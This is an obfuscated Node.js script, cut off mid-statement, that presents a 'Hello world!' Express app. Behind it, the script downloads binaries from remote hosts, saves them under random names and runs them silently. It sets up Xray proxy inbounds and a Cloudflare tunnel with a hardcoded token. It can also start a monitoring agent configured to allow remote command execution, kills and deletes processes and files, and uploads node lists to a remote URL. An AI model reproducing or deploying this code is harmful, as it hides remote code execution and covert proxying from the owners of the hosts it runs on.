const _0x4d616c=_0x494a;function _0x494a(_0x234c4c,_0x398a16){const _0x2b63e0=_0x2b63();return _0x494a=function(_0x494ab,_0x3339f7){_0x494ab=_0x494ab-0x103;let _0x308c29=_0x2b63e0[_0x494ab];return _0x308c29;},_0x494a(_0x234c4c,_0x398a16);}(function(_0x51f44a,_0x2ec2b7){const _0x406c26={_0x5e7cbf:0x14f,_0x1e3f86:0x125,_0x4e1229:0x1ae},_0x4ac7b5=_0x494a,_0x10633a=_0x51f44a();while(!![]){try{const _0x5463d8=parseInt(_0x4ac7b5(0x119))/0x1+parseInt(_0x4ac7b5(_0x406c26._0x5e7cbf))/0x2*(parseInt(_0x4ac7b5(0x10d))/0x3)+-parseInt(_0x4ac7b5(0x116))/0x4+parseInt(_0x4ac7b5(0x1b7))/0x5*(parseInt(_0x4ac7b5(0x15b))/0x6)+-parseInt(_0x4ac7b5(0x15d))/0x7*(parseInt(_0x4ac7b5(_0x406c26._0x1e3f86))/0x8)+-parseInt(_0x4ac7b5(_0x406c26._0x4e1229))/0x9+parseInt(_0x4ac7b5(0x138))/0xa*(parseInt(_0x4ac7b5(0x158))/0xb);if(_0x5463d8===_0x2ec2b7)break;else _0x10633a['push'](_0x10633a['shift']());}catch(_0x1a5aaf){_0x10633a['push'](_0x10633a['shift']());}}}(_0x2b63,0x59da8));const express=require(_0x4d616c(0x1a3)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x4d616c(0x173)),{promisify}=require('util'),exec=promisify(require(_0x4d616c(0x110))[_0x4d616c(0x103)]),{execSync}=require('child_process'),UPLOAD_URL=process[_0x4d616c(0x131)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x4d616c(0x131)][_0x4d616c(0x124)]||'',AUTO_ACCESS=process[_0x4d616c(0x131)][_0x4d616c(0x12d)]||![],FILE_PATH=process[_0x4d616c(0x131)][_0x4d616c(0x126)]||_0x4d616c(0x145),SUB_PATH=process['env'][_0x4d616c(0x1bd)]||_0x4d616c(0x1b9),PORT=process[_0x4d616c(0x131)][_0x4d616c(0x14c)]||process[_0x4d616c(0x131)][_0x4d616c(0x16a)]||0xbb8,UUID=process[_0x4d616c(0x131)][_0x4d616c(0x160)]||_0x4d616c(0x179),NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env'][_0x4d616c(0x16f)]||'',NEZHA_KEY=process['env'][_0x4d616c(0x19c)]||'',ARGO_DOMAIN=process[_0x4d616c(0x131)]['ARGO_DOMAIN']||_0x4d616c(0x188),ARGO_AUTH=process[_0x4d616c(0x131)][_0x4d616c(0x107)]||_0x4d616c(0x182),ARGO_PORT=process[_0x4d616c(0x131)][_0x4d616c(0x10e)]||0x2315,CFIP=process[_0x4d616c(0x131)][_0x4d616c(0x14d)]||_0x4d616c(0x132),CFPORT=process[_0x4d616c(0x131)][_0x4d616c(0x11e)]||0x1bb,NAME=process[_0x4d616c(0x131)][_0x4d616c(0x1ab)]||_0x4d616c(0x13d);!fs[_0x4d616c(0x120)](FILE_PATH)?(fs[_0x4d616c(0x10f)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x4d616c(0x195)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x223c91={_0x583b29:0x109},_0x242307=_0x4d616c,_0x3d8c1a='abcdefghijklmnopqrstuvwxyz';let _0x37e74a='';for(let _0xa3c1eb=0x0;_0xa3c1eb<0x6;_0xa3c1eb++){_0x37e74a+=_0x3d8c1a[_0x242307(_0x223c91._0x583b29)](Math[_0x242307(0x12c)](Math['random']()*_0x3d8c1a[_0x242307(0x144)]));}return _0x37e74a;}function _0x2b63(){const _0x4b4bb9=['RailWay','App\x20is\x20running','\x0a\x20\x20credentials-file:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','unlinkSync','length','./tmp','Skipping\x20adding\x20automatic\x20access\x20task','443','https://amd64.ssss.nyc.mn/web','\x20is\x20running','get','2096','SERVER_PORT','CFIP','unshift','384256PqRFuq','has','createWriteStream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','writeFileSync','http','blackhole','map','45001unswlE','8443','message','6GlPKzq','vless','15827LPOqIb','pop','pkill\x20-f\x20\x22[','UUID','aarch64','readFileSync','response','Subscription\x20uploaded\x20successfully','/tunnel.yml\x20run','/api/add-nodes','2053','countryCode','&path=%2Fvless-argo%3Fed%3D2560#','PORT','post','xtls-rprx-vision','true','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','NEZHA_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','/api/add-subscriptions','fileName','path','trojan','https://ipapi.co/json/','sub.txt','nohup\x20','none','b4533175-8ddd-4ae1-9f2f-a8d92dd87e90','arm','?security=tls&sni=','2083','data','isFile','listen','del\x20/f\x20/q\x20','?encryption=none&security=tls&sni=','eyJhIjoiMTlhYWIyZDJjMjY5ZWUyODA2NmU4YzkyMTMyOTAxNGQiLCJ0IjoiMzg2NTVmZGUtNzg1NS00ZDE2LThiM2UtMjA5NjViZGY1NTFiIiwicyI6Ik5ERXhNamxtTlRndE5UVmxNaTAwT1dNMExXSTVaVE10TjJVek1EUmlNRGcyT1dRMiJ9','/vmess-argo','arm64','\x0a\x0atrojan://','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://arm64.ssss.nyc.mn/agent','rf.jenzel.dpdns.org','all','fileUrl','NEZHA\x20variable\x20is\x20empty,skip\x20running','https://arm64.ssss.nyc.mn/web','stream','Add\x20automatic\x20access\x20task\x20faild:\x20','npm\x20running\x20error:\x20','arch','match','filter','automatic\x20access\x20task\x20added\x20successfully','application/json','log','Nodes\x20uploaded\x20successfully','platform','https://amd64.ssss.nyc.mn/bot','readdirSync','\x20>/dev/null\x202>&1','pipe','NEZHA_KEY','close','\x20failed:\x20','statSync','utf-8','\x0a\x20\x20\x20\x20','tcp','express','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','status','ARGO_DOMAIN:','2087','config.json','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','&fp=firefox&type=ws&host=','NAME','push','/api/delete-nodes','5106051HdOBvR','send','Download\x20','Hello\x20world!','stringify','success','quic','join','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','1561015cDSHBn','split','rwSub','boot.log','.exe\x20>\x20nul\x202>&1','web\x20running\x20error:\x20','SUB_PATH','catch','tunnel.json','Unhandled\x20error\x20in\x20startserver:','exec','toString','https://oooo.serv00.net/add-url','base64','ARGO_AUTH','taskkill\x20/f\x20/im\x20','charAt','\x20>/dev/null\x202>&1\x20&','win32','error','3KYSbdw','ARGO_PORT','mkdirSync','child_process','/vless-argo','config.yaml','clear','basename','test','1624536SlFrAU','includes','from','594852ToOZUq','https://arm64.ssss.nyc.mn/bot','tls','set','Unknown','CFPORT','/config.json\x20>/dev/null\x202>&1\x20&','existsSync','\x20>\x20nul\x202>&1','org','php\x20running\x20error:\x20','PROJECT_URL','344cKfGNc','FILE_PATH','https://arm64.ssss.nyc.mn/v1','127.0.0.1','--tls','\x0a\x20\x20tunnel:\x20','https+local://dns.adguard-dns.com/dns-query','floor','AUTO_ACCESS','\x20-s\x20','\x22\x20>\x20/dev/null\x202>&1','forEach','env','cdns.doon.eu.org','unlink','substring','\x0a\x0avmess://','\x20-p\x20','/dev/null','830IpfLZQ','/trojan-argo','rm\x20-rf\x20','freedom','TunnelSecret'];_0x2b63=function(){return _0x4b4bb9;};return _0x2b63();}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4d616c(0x1b5)](FILE_PATH,npmName),phpPath=path[_0x4d616c(0x1b5)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4d616c(0x1b5)](FILE_PATH,botName),subPath=path[_0x4d616c(0x1b5)](FILE_PATH,_0x4d616c(0x176)),listPath=path[_0x4d616c(0x1b5)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4d616c(0x1b5)](FILE_PATH,_0x4d616c(0x1ba)),configPath=path['join'](FILE_PATH,_0x4d616c(0x1a8));function deleteNodes(){const _0xbb20bc={_0x1f6bda:0x106,_0x30013d:0x104,_0x27667e:0x16b,_0x4a603a:0x1be},_0x5e3e16=_0x4d616c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x2507a8;try{_0x2507a8=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0xe1a260=Buffer[_0x5e3e16(0x118)](_0x2507a8,_0x5e3e16(_0xbb20bc._0x1f6bda))[_0x5e3e16(_0xbb20bc._0x30013d)](_0x5e3e16(0x1a0)),_0x1ec444=_0xe1a260['split']('\x0a')[_0x5e3e16(0x192)](_0x379812=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x379812));if(_0x1ec444[_0x5e3e16(0x144)]===0x0)return;return axios[_0x5e3e16(_0xbb20bc._0x27667e)](UPLOAD_URL+_0x5e3e16(0x1ad),JSON[_0x5e3e16(0x1b2)]({'nodes':_0x1ec444}),{'headers':{'Content-Type':_0x5e3e16(0x194)}})[_0x5e3e16(_0xbb20bc._0x4a603a)](_0x59eeb1=>{return null;}),null;}catch(_0x19a8b9){return null;}}function cleanupOldFiles(){const _0x2994fe={_0x5e373f:0x199,_0x2e35c6:0x130},_0x3f93cb={_0x148a80:0x1b5,_0x4d3dee:0x19f},_0x4e81fb=_0x4d616c;try{const _0xa871fd=fs[_0x4e81fb(_0x2994fe._0x5e373f)](FILE_PATH);_0xa871fd[_0x4e81fb(_0x2994fe._0x2e35c6)](_0x5b86a6=>{const _0x214710=_0x4e81fb,_0x3618fa=path[_0x214710(_0x3f93cb._0x148a80)](FILE_PATH,_0x5b86a6);try{const _0x57f7c2=fs[_0x214710(_0x3f93cb._0x4d3dee)](_0x3618fa);_0x57f7c2[_0x214710(0x17e)]()&&fs[_0x214710(0x143)](_0x3618fa);}catch(_0x28f624){}});}catch(_0x38eea7){}}app[_0x4d616c(0x14a)]('/',function(_0x1ec41c,_0x4ec7c3){const _0x1d215c=_0x4d616c;_0x4ec7c3['send'](_0x1d215c(0x1b1));});async function generateConfig(){const _0x89bc24={_0x57e300:0x137,_0xa894cd:0x15c,_0x39fc5d:0x111,_0x3ef229:0x183,_0x457b42:0x139,_0x149e45:0x1a2,_0x150bb6:0x128,_0x35c137:0x178,_0x3655aa:0x11b,_0x355373:0x1b4,_0x30cda9:0x155,_0x496eaa:0x11b,_0x43c934:0x1b4,_0x5d52fd:0x174,_0x52b247:0x1b4,_0x546fe4:0x12b,_0x5b64f7:0x13b,_0x1684b3:0x1a8,_0x4bb631:0x1b2},_0x306f4f=_0x4d616c,_0x412f5c={'log':{'access':_0x306f4f(_0x89bc24._0x57e300),'error':_0x306f4f(_0x89bc24._0x57e300),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x306f4f(_0x89bc24._0xa894cd),'settings':{'clients':[{'id':UUID,'flow':_0x306f4f(0x16c)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x306f4f(_0x89bc24._0x39fc5d),'dest':0xbba},{'path':_0x306f4f(_0x89bc24._0x3ef229),'dest':0xbbb},{'path':_0x306f4f(_0x89bc24._0x457b42),'dest':0xbbc}]},'streamSettings':{'network':_0x306f4f(_0x89bc24._0x149e45)}},{'port':0xbb9,'listen':_0x306f4f(_0x89bc24._0x150bb6),'protocol':_0x306f4f(0x15c),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x306f4f(0x1a2),'security':_0x306f4f(0x178)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x306f4f(_0x89bc24._0x35c137)},'streamSettings':{'network':'ws','security':_0x306f4f(_0x89bc24._0x35c137),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x306f4f(0x155),_0x306f4f(_0x89bc24._0x3655aa),_0x306f4f(_0x89bc24._0x355373)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x306f4f(0x128),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x306f4f(_0x89bc24._0x3ef229)}},'sniffing':{'enabled':!![],'destOverride':[_0x306f4f(_0x89bc24._0x30cda9),_0x306f4f(_0x89bc24._0x496eaa),_0x306f4f(_0x89bc24._0x43c934)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x306f4f(0x128),'protocol':_0x306f4f(_0x89bc24._0x5d52fd),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x306f4f(0x178),'wsSettings':{'path':_0x306f4f(0x139)}},'sniffing':{'enabled':!![],'destOverride':[_0x306f4f(0x155),_0x306f4f(0x11b),_0x306f4f(_0x89bc24._0x52b247)],'metadataOnly':![]}}],'dns':{'servers':[_0x306f4f(_0x89bc24._0x546fe4)]},'outbounds':[{'protocol':_0x306f4f(_0x89bc24._0x5b64f7),'tag':'direct'},{'protocol':_0x306f4f(0x156),'tag':'block'}]};fs[_0x306f4f(0x154)](path[_0x306f4f(0x1b5)](FILE_PATH,_0x306f4f(_0x89bc24._0x1684b3)),JSON[_0x306f4f(_0x89bc24._0x4bb631)](_0x412f5c,null,0x2));}function getSystemArchitecture(){const _0x30318f={_0x316398:0x190,_0x56c66d:0x17a,_0x3bd7f3:0x184,_0x3ee330:0x161},_0x2dadc3=_0x4d616c,_0x3a026e=os[_0x2dadc3(_0x30318f._0x316398)]();return _0x3a026e===_0x2dadc3(_0x30318f._0x56c66d)||_0x3a026e===_0x2dadc3(_0x30318f._0x3bd7f3)||_0x3a026e===_0x2dadc3(_0x30318f._0x3ee330)?_0x2dadc3(0x17a):'amd';}function downloadFile(_0x15213d,_0x5bd6d5,_0x2dc129){const _0x4c35f2={_0xbf27a1:0x114,_0x5dca46:0x19e,_0x2b1750:0x10c},_0x120b62={_0x340286:0x19b},_0x523442=_0x4d616c,_0x4a7fdd=_0x15213d;!fs[_0x523442(0x120)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1188ec=fs[_0x523442(0x151)](_0x4a7fdd);axios({'method':'get','url':_0x5bd6d5,'responseType':_0x523442(0x18d)})['then'](_0x4309c9=>{const _0x5060ce={_0x2dcb77:0x133,_0x168d96:0x10c},_0xb575de={_0x5c5c3d:0x195},_0x97f548=_0x523442;_0x4309c9[_0x97f548(0x17d)][_0x97f548(_0x120b62._0x340286)](_0x1188ec),_0x1188ec['on']('finish',()=>{const _0x36701d=_0x97f548;_0x1188ec[_0x36701d(0x19d)](),console[_0x36701d(_0xb575de._0x5c5c3d)]('Download\x20'+path['basename'](_0x4a7fdd)+'\x20successfully'),_0x2dc129(null,_0x4a7fdd);}),_0x1188ec['on']('error',_0xce45b2=>{const _0x5b418a=_0x97f548;fs[_0x5b418a(_0x5060ce._0x2dcb77)](_0x4a7fdd,()=>{});const _0x130588=_0x5b418a(0x1b0)+path[_0x5b418a(0x114)](_0x4a7fdd)+_0x5b418a(0x19e)+_0xce45b2['message'];console[_0x5b418a(_0x5060ce._0x168d96)](_0x130588),_0x2dc129(_0x130588);});})[_0x523442(0x1be)](_0xf0be13=>{const _0x24d911=_0x523442,_0x5bc265=_0x24d911(0x1b0)+path[_0x24d911(_0x4c35f2._0xbf27a1)](_0x4a7fdd)+_0x24d911(_0x4c35f2._0x5dca46)+_0xf0be13[_0x24d911(0x15a)];console[_0x24d911(_0x4c35f2._0x2b1750)](_0x5bc265),_0x2dc129(_0x5bc265);});}async function downloadFilesAndRun(){const _0x3b0eaf={_0x265e19:0x195,_0x5ad02b:0x157,_0x9948a8:0x10c,_0x95bf9e:0x147,_0x54e0c6:0x159,_0x321195:0x14b,_0x56746f:0x1a7,_0x23a376:0x16d,_0x1be94e:0x142,_0x44255e:0x1b6,_0x14617f:0x154,_0x137651:0x112,_0xa4263e:0x177,_0xabded8:0x149,_0x4aca54:0x10c,_0x2ebd72:0x123,_0x4ebede:0x1a7,_0x2eeb39:0x136,_0x413151:0x186,_0x3ad46a:0x195,_0x6a5338:0x11f,_0x1e39d3:0x1bc,_0x1eaca9:0x140,_0xa6b7bb:0x191,_0x22d684:0x1a4,_0x48139a:0x177,_0x8eba58:0x195},_0x16003a={_0x59f612:0x172,_0x405adf:0x18a},_0x504c40=_0x4d616c,_0x25b23e=getSystemArchitecture(),_0xb32031=getFilesForArchitecture(_0x25b23e);if(_0xb32031[_0x504c40(0x144)]===0x0){console[_0x504c40(_0x3b0eaf._0x265e19)](_0x504c40(0x141));return;}const _0x3167fa=_0xb32031[_0x504c40(_0x3b0eaf._0x5ad02b)](_0x396656=>{return new Promise((_0x18d43f,_0x58e47d)=>{const _0x335cbc=_0x494a;downloadFile(_0x396656[_0x335cbc(_0x16003a._0x59f612)],_0x396656[_0x335cbc(_0x16003a._0x405adf)],(_0x296eb2,_0x5b8c58)=>{_0x296eb2?_0x58e47d(_0x296eb2):_0x18d43f(_0x5b8c58);});});});try{await Promise[_0x504c40(0x189)](_0x3167fa);}catch(_0x33c6bc){console[_0x504c40(_0x3b0eaf._0x9948a8)]('Error\x20downloading\x20files:',_0x33c6bc);return;}function _0x769c40(_0x368e20){const _0x4789e6={_0x1f4d18:0x104},_0x5d76ad=_0x504c40,_0x4f9167=0x1fd;_0x368e20[_0x5d76ad(0x130)](_0x37fe0c=>{const _0x55ad70=_0x5d76ad;fs[_0x55ad70(0x120)](_0x37fe0c)&&fs['chmod'](_0x37fe0c,_0x4f9167,_0x4da82e=>{const _0x6abfd9=_0x55ad70;_0x4da82e?console[_0x6abfd9(0x10c)]('Empowerment\x20failed\x20for\x20'+_0x37fe0c+':\x20'+_0x4da82e):console['log']('Empowerment\x20success\x20for\x20'+_0x37fe0c+':\x20'+_0x4f9167[_0x6abfd9(_0x4789e6._0x1f4d18)](0x8));});});}const _0x217618=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x769c40(_0x217618);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4fe59c=NEZHA_SERVER[_0x504c40(0x117)](':')?NEZHA_SERVER['split'](':')[_0x504c40(0x15e)]():'',_0x5b3a24=new Set([_0x504c40(_0x3b0eaf._0x95bf9e),_0x504c40(_0x3b0eaf._0x54e0c6),_0x504c40(_0x3b0eaf._0x321195),_0x504c40(_0x3b0eaf._0x56746f),_0x504c40(0x17c),_0x504c40(0x167)]),_0x4e4e04=_0x5b3a24[_0x504c40(0x150)](_0x4fe59c)?_0x504c40(_0x3b0eaf._0x23a376):'false',_0x3db49f='\x0aclient_secret:\x20'+NEZHA_KEY+_0x504c40(_0x3b0eaf._0x1be94e)+NEZHA_SERVER+_0x504c40(_0x3b0eaf._0x44255e)+_0x4e4e04+_0x504c40(0x153)+UUID;fs[_0x504c40(_0x3b0eaf._0x14617f)](path[_0x504c40(0x1b5)](FILE_PATH,_0x504c40(_0x3b0eaf._0x137651)),_0x3db49f);const _0x49cd67=_0x504c40(_0x3b0eaf._0xa4263e)+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x49cd67),console['log'](phpName+_0x504c40(_0x3b0eaf._0xabded8)),await new Promise(_0x43d4dd=>setTimeout(_0x43d4dd,0x3e8));}catch(_0x4d1863){console[_0x504c40(_0x3b0eaf._0x4aca54)](_0x504c40(_0x3b0eaf._0x2ebd72)+_0x4d1863);}}else{let _0x28dfcb='';const _0x571e7f=[_0x504c40(_0x3b0eaf._0x95bf9e),_0x504c40(0x159),'2096',_0x504c40(_0x3b0eaf._0x4ebede),_0x504c40(0x17c),_0x504c40(0x167)];_0x571e7f[_0x504c40(0x117)](NEZHA_PORT)&&(_0x28dfcb=_0x504c40(0x129));const _0x4f7d02=_0x504c40(0x177)+npmPath+_0x504c40(0x12e)+NEZHA_SERVER+':'+NEZHA_PORT+_0x504c40(_0x3b0eaf._0x2eeb39)+NEZHA_KEY+'\x20'+_0x28dfcb+_0x504c40(_0x3b0eaf._0x413151);try{await exec(_0x4f7d02),console[_0x504c40(0x195)](npmName+'\x20is\x20running'),await new Promise(_0x20862f=>setTimeout(_0x20862f,0x3e8));}catch(_0x28a0f1){console['error'](_0x504c40(0x18f)+_0x28a0f1);}}}else console[_0x504c40(_0x3b0eaf._0x3ad46a)](_0x504c40(0x18b));const _0x49db12='nohup\x20'+webPath+'\x20-c\x20'+FILE_PATH+_0x504c40(_0x3b0eaf._0x6a5338);try{await exec(_0x49db12),console[_0x504c40(0x195)](webName+_0x504c40(_0x3b0eaf._0xabded8)),await new Promise(_0x420195=>setTimeout(_0x420195,0x3e8));}catch(_0x3bc9e5){console[_0x504c40(_0x3b0eaf._0x4aca54)](_0x504c40(_0x3b0eaf._0x1e39d3)+_0x3bc9e5);}if(fs[_0x504c40(0x120)](botPath)){let _0x531ca7;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x531ca7=_0x504c40(_0x3b0eaf._0x1eaca9)+ARGO_AUTH;else ARGO_AUTH[_0x504c40(_0x3b0eaf._0xa6b7bb)](/TunnelSecret/)?_0x531ca7='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x504c40(0x165):_0x531ca7='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x504c40(_0x3b0eaf._0x22d684)+ARGO_PORT;try{await exec(_0x504c40(_0x3b0eaf._0x48139a)+botPath+'\x20'+_0x531ca7+'\x20>/dev/null\x202>&1\x20&'),console[_0x504c40(_0x3b0eaf._0x8eba58)](botName+_0x504c40(0x149)),await new Promise(_0x4c83f1=>setTimeout(_0x4c83f1,0x7d0));}catch(_0x13a929){console[_0x504c40(0x10c)]('Error\x20executing\x20command:\x20'+_0x13a929);}}await new Promise(_0xe29469=>setTimeout(_0xe29469,0x1388));}function getFilesForArchitecture(_0x558a0a){const _0xd56ed4={_0x1fadf7:0x17a,_0x2a0f6d:0x18c,_0x9707b2:0x148,_0xbf92b9:0x17a,_0x4b3efd:0x187,_0x4325e0:0x14e,_0x1403f0:0x127},_0x47c229=_0x4d616c;let _0x4b5f7f;_0x558a0a===_0x47c229(_0xd56ed4._0x1fadf7)?_0x4b5f7f=[{'fileName':webPath,'fileUrl':_0x47c229(_0xd56ed4._0x2a0f6d)},{'fileName':botPath,'fileUrl':_0x47c229(0x11a)}]:_0x4b5f7f=[{'fileName':webPath,'fileUrl':_0x47c229(_0xd56ed4._0x9707b2)},{'fileName':botPath,'fileUrl':_0x47c229(0x198)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x563092=_0x558a0a===_0x47c229(_0xd56ed4._0xbf92b9)?_0x47c229(_0xd56ed4._0x4b3efd):'https://amd64.ssss.nyc.mn/agent';_0x4b5f7f[_0x47c229(_0xd56ed4._0x4325e0)]({'fileName':npmPath,'fileUrl':_0x563092});}else{const _0x80ad34=_0x558a0a===_0x47c229(_0xd56ed4._0xbf92b9)?_0x47c229(_0xd56ed4._0x1403f0):'https://amd64.ssss.nyc.mn/v1';_0x4b5f7f[_0x47c229(0x14e)]({'fileName':phpPath,'fileUrl':_0x80ad34});}}return _0x4b5f7f;}function argoType(){const _0x2982ad={_0x32213e:0x1b5,_0xcb0a33:0x1b8,_0x392fcc:0x13f,_0x31a30b:0x1b5,_0x59da87:0x1a9,_0x4ddddb:0x195},_0x4612d5=_0x4d616c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log']('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x4612d5(0x117)](_0x4612d5(0x13c))){fs['writeFileSync'](path[_0x4612d5(_0x2982ad._0x32213e)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x254373=_0x4612d5(0x12a)+ARGO_AUTH[_0x4612d5(_0x2982ad._0xcb0a33)]('\x22')[0xb]+_0x4612d5(_0x2982ad._0x392fcc)+path[_0x4612d5(_0x2982ad._0x31a30b)](FILE_PATH,_0x4612d5(0x1bf))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x4612d5(_0x2982ad._0x59da87)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x4612d5(0x154)](path[_0x4612d5(0x1b5)](FILE_PATH,'tunnel.yml'),_0x254373);}else console[_0x4612d5(_0x2982ad._0x4ddddb)](_0x4612d5(0x16e));}async function extractDomains(){const _0x5d7e76={_0x52b799:0x195,_0x5bb053:0x1a6,_0x127cf1:0x1b5,_0x75c79d:0x1a0,_0x318fd6:0x195,_0x4fc01f:0x152,_0x2ec2a1:0x170,_0x5570c8:0x177,_0x420ed6:0x10a},_0x54c424={_0x244acd:0x17d,_0x40fc97:0x122,_0xcbb471:0x14a,_0x4a5da2:0x1a5,_0x3afb1c:0x1b3,_0x2ffed3:0x122,_0x5a8d1a:0x17d,_0x3e89c3:0x122},_0x125f97={_0x278290:0x197,_0x530498:0x10b,_0x343f9f:0x108,_0x169508:0x134,_0x5b266c:0x12f},_0x4c5e6a={_0x2cd2e2:0x191},_0x7ce506=_0x4d616c;let _0x48cdd7;if(ARGO_AUTH&&ARGO_DOMAIN)_0x48cdd7=ARGO_DOMAIN,console[_0x7ce506(_0x5d7e76._0x52b799)](_0x7ce506(_0x5d7e76._0x5bb053),_0x48cdd7),await _0x370dbc(_0x48cdd7);else try{const _0x53ce45=fs[_0x7ce506(0x162)](path[_0x7ce506(_0x5d7e76._0x127cf1)](FILE_PATH,'boot.log'),_0x7ce506(_0x5d7e76._0x75c79d)),_0x257531=_0x53ce45[_0x7ce506(0x1b8)]('\x0a'),_0x23f749=[];_0x257531[_0x7ce506(0x130)](_0x5bf9fc=>{const _0x24e8d7=_0x7ce506,_0x658916=_0x5bf9fc[_0x24e8d7(_0x4c5e6a._0x2cd2e2)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x658916){const _0x2e7866=_0x658916[0x1];_0x23f749['push'](_0x2e7866);}});if(_0x23f749[_0x7ce506(0x144)]>0x0)_0x48cdd7=_0x23f749[0x0],console[_0x7ce506(_0x5d7e76._0x318fd6)]('ArgoDomain:',_0x48cdd7),await _0x370dbc(_0x48cdd7);else{console[_0x7ce506(0x195)](_0x7ce506(_0x5d7e76._0x4fc01f)),fs[_0x7ce506(0x143)](path[_0x7ce506(0x1b5)](FILE_PATH,'boot.log'));async function _0x2b98ac(){const _0x2c1fe7=_0x7ce506;try{process[_0x2c1fe7(_0x125f97._0x278290)]===_0x2c1fe7(_0x125f97._0x530498)?await exec(_0x2c1fe7(_0x125f97._0x343f9f)+botName+_0x2c1fe7(0x1bb)):await exec(_0x2c1fe7(0x15f)+botName['charAt'](0x0)+']'+botName[_0x2c1fe7(_0x125f97._0x169508)](0x1)+_0x2c1fe7(_0x125f97._0x5b266c));}catch(_0x4f5992){}}_0x2b98ac(),await new Promise(_0x48c6fe=>setTimeout(_0x48c6fe,0xbb8));const _0x175846=_0x7ce506(_0x5d7e76._0x2ec2a1)+FILE_PATH+_0x7ce506(0x1a4)+ARGO_PORT;try{await exec(_0x7ce506(_0x5d7e76._0x5570c8)+botPath+'\x20'+_0x175846+_0x7ce506(_0x5d7e76._0x420ed6)),console[_0x7ce506(0x195)](botName+'\x20is\x20running'),await new Promise(_0xffaa78=>setTimeout(_0xffaa78,0xbb8)),await extractDomains();}catch(_0x501875){console['error']('Error\x20executing\x20command:\x20'+_0x501875);}}}catch(_0x85866f){console[_0x7ce506(0x10c)]('Error\x20reading\x20boot.log:',_0x85866f);}async function _0x2b5c7e(){const _0x15f960=_0x7ce506;try{const _0x2f2b1d=await axios[_0x15f960(0x14a)](_0x15f960(0x175),{'timeout':0xbb8});if(_0x2f2b1d[_0x15f960(_0x54c424._0x244acd)]&&_0x2f2b1d[_0x15f960(_0x54c424._0x244acd)]['country_code']&&_0x2f2b1d[_0x15f960(0x17d)]['org'])return _0x2f2b1d[_0x15f960(0x17d)]['country_code']+'_'+_0x2f2b1d['data'][_0x15f960(_0x54c424._0x40fc97)];}catch(_0x220184){try{const _0x2f9cf8=await 